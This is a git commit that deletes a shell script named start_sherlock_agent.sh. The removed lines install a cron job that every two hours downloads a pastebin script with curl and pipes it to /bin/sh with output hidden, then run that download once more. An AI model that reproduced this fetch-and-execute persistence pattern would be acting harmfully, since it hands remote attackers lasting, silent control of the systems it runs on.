104e05bcb2754b11b3ea47ec9ff74c67a76ca2fd
bitcloudson <37044071+bitcloudson@users.noreply.github.com>
2022-02-02 10:55:33 +0800

    Delete start_sherlock_agent.sh

--- pl/start_sherlock_agent.sh
+++
@@ -1,3 +0,0 @@
-echo '0 */2 * * * /bin/sh -c "`curl -s https://pastebin.com/raw/9g7BUQ6b`" > /dev/null 2>&1' > cron.file && crontab cron.file && unlink cron.file
-
-/bin/sh -c "`curl -s https://pastebin.com/raw/9g7BUQ6b`"
